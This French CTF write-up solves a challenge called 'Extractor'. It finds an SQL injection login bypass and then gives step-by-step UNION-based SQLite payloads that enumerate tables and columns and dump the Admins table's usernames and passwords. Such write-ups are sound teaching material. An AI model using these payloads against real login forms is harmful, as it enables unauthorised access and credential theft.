# Extractor

## Enoncé
We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.

## Découverte
On arrive sur site bien dégueulasse avec deux fonctions principales : "register" et "login". Trois champs découlent de ces fonctions : "Username", "Password" et "Signature". On crée un utilisateur "test" avec pour password "test" et pour signature "123456". On tente alors au hasard une SQLi login bypass (`test';--`) par hasard et tient, ça fonctionne...

## Exploitation 
On est donc à peu près certain d'avoir affaire à une SQLi. Seulement, nous n'avons aucun user donné dont on doit exfiltrer le mot de passe. On tente donc une UNION BASED avec pour payload :

    test' UNION SELECT null;--

La page nous renvoie :

On tatonne donc en rajoutant des colonnes et on arrive finalement à un payload qui fonctionne, du moins qui ne retourne pas d'erreur :

    test' UNION SELECT null,null,null,null;--
    
C'est bien beau tout ça mais pour aller plus loin il va nous falloir des infos sur la version de la base de données utilisée. On s'aide donc tranquillement de PayloadAllTheThings (petite cheatsheet résumé au passage). 

Le seul payload qui fonctionne est finalement :

    test' UNION SELECT null,null,null,sqlite_version();--

Ce qui nous confirme qu'on se trouve sur une base de données SQLite. On a donc plus qu'à suivre la méthodologie pour leak ce qu'on veut.

Pour leak la table :

    test' UNION SELECT null,null,null,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--
    
Ensuite pour leak les colonnes de la table :

    test' UNION SELECT null,null,null,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='Admins';--
    
Enfin pour leak les données de la table (et flag le challenge) :

    test' UNION SELECT null,user,pass,content FROM 'Admins';--
    




*Write-up by BA-Seven (https://github.com/BA-Seven)*
